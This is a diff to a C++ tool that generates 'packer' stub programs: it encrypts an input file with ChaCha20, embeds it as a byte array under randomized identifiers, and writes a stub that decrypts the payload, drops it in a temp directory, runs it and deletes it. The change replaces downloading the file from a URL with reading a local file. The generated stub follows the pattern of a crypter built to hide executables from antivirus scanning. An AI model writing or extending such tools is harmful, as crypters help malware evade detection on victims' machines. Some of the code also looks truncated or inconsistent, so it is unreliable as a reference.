@@ -1,3 +1,29 @@
+    std::vector<unsigned char> nonceBytes = )" + keyVar + R"(FromDecimal()" + nonceVar + R"();
+    
+    )" + funcName + R"(()" + bufferVar + R"(, keyBytes.data(), nonceBytes.data());
+    
+#ifdef _WIN32
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string tempFile = std::string(tempPath) + "\\upx_local_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
+#else
+    std::string tempFile = "/tmp/upx_local_temp_" + std::to_string(getpid());
+#endif
+    
+    std::ofstream outFile(tempFile, std::ios::binary);
+    if (!outFile) return 1;
+    
+    outFile.write(reinterpret_cast<const char*>()" + bufferVar + R"(.data()), )" + bufferVar + R"(.size());
+    outFile.close();
+    
+#ifdef _WIN32
+    STARTUPINFOA si = {sizeof(si)};
+    PROCESS_INFORMATION pi;
+    if (CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
     DeleteFileA(tempFile.c_str());
 #else
     chmod(tempFile.c_str(), 0755);
@@ -9,7 +35,8 @@
 })";
 
         // Save the packed executable source
-        std::string outputFile = "url_packed_chacha20_" + std::to_string(rng() % 10000) + ".cpp";
+        std::filesystem::path inputPath(inputFile);
+        std::string outputFile = "local_packed_chacha20_" + inputPath.stem().string() + "_" + std::to_string(rng() % 10000) + ".cpp";
         
         std::ofstream outFile(outputFile);
         if (!outFile) {
@@ -20,25 +47,28 @@
         outFile << sourceCode;
         outFile.close();
 
-        std::cout << "✅ URL ChaCha20 Packer generated successfully!" << std::endl;
+        std::cout << "✅ Local ChaCha20 Packer generated successfully!" << std::endl;
         std::cout << "📁 Output: " << outputFile << std::endl;
         std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
         std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
-        std::cout << "🌐 Source URL: " << url << std::endl;
-        std::cout << "📋 Compile with: g++ -O2 " << outputFile << " -o url_packed_chacha20.exe" << std::endl;
+        std::cout << "📂 Source file: " << inputFile << std::endl;
+        std::cout << "📋 Compile with: g++ -O2 " << outputFile << " -o local_packed_chacha20_" << inputPath.stem().string() << ".exe" << std::endl;
     }
 
-    // URL Pack File - Triple (option 12)
-    void urlPackFileTriple() {
-        std::string url;
-        std::cout << "Enter URL to download and pack: ";
-        std::getline(std::cin, url);
+    // Local Crypto Service - Triple (option 15)
+    void localCryptoServiceTriple() {
+        std::string inputFile;
+        std::cout << "Enter local file path to pack: ";
+        std::getline(std::cin, inputFile);
 
-        std::vector<uint8_t> fileData;
-        if (!downloadFile(url, fileData)) {
-            std::cout << "❌ Failed to download file from URL" << std::endl;
+        std::ifstream file(inputFile, std::ios::binary);
+        if (!file) {
+            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
             return;
         }
+
+        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+        file.close();
 
         // Generate all keys
         auto keys = generateKeys();
@@ -177,7 +207,7 @@ void )" + funcName2 + R"((std::vector<unsigned char>& data, const std::vector<un
         0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
         0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
         0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
-        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
+        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
         0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
     };
     
@@ -228,17 +258,18 @@ int main() {
     
     unsigned char )" + payloadVar + R"([)" + std::to_string(encryptedData.size()) + R"(] = {)";
 
-        // Embed the encrypted payload (truncated for space)
-        for (size_t i = 0; i < std::min(encryptedData.size(), size_t(100)); i++) {
+        // Embed the encrypted payload (truncated for large files)
+        size_t maxEmbedSize = std::min(encryptedData.size(), size_t(200));
+        for (size_t i = 0; i < maxEmbedSize; i++) {
             if (i % 16 == 0) sourceCode += "\n        ";
             sourceCode += "0x" + 
                 std::string(1, "0123456789ABCDEF"[(encryptedData[i] >> 4) & 0xF]) + 
                 std::string(1, "0123456789ABCDEF"[encryptedData[i] & 0xF]);
-            if (i < std::min(encryptedData.size(), size_t(100)) - 1) sourceCode += ",";
+            if (i < maxEmbedSize - 1) sourceCode += ",";
         }
         
-        if (encryptedData.size() > 100) {
-            sourceCode += "\n        /* ... " + std::to_string(encryptedData.size() - 100) + " more bytes ... */";
+        if (encryptedData.size() > 200) {
+            sourceCode += "\n        /* ... " + std::to_string(encryptedData.size() - 200) + " more bytes ... */";
         }
 
         sourceCode += R"(
@@ -287,36 +318,5 @@ int main() {
 #ifdef _WIN32
     char tempPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath);
-    std::string tempFile = std::string(tempPath) + "\\upx_url_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
+    std::string tempFile = std::string(tempPath) + "\\upx_local_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
 #else
-    std::string tempFile = "/tmp/upx_url_temp_" + std::to_string(getpid());
-#endif
-    
-    std::ofstream outFile(tempFile, std::ios::binary);
-    if (!outFile) return 1;
-    
-    outFile.write(reinterpret_cast<const char*>()" + bufferVar + R"(.data()), )" + bufferVar + R"(.size());
-    outFile.close();
-    
-#ifdef _WIN32
-    STARTUPINFOA si = {sizeof(si)};
-    PROCESS_INFORMATION pi;
-    if (CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-    DeleteFileA(tempFile.c_str());
-#else
-    chmod(tempFile.c_str(), 0755);
-    system(tempFile.c_str());
-    unlink(tempFile.c_str());
-#endif
-    
-    return 0;
-})";
-
-        // Save the packed executable source
-        std::string outputFile = "url_packed_triple_" + std::to_string(rng() % 10000) + ".cpp";
-        
-        std::ofstream outFile(outputFile);
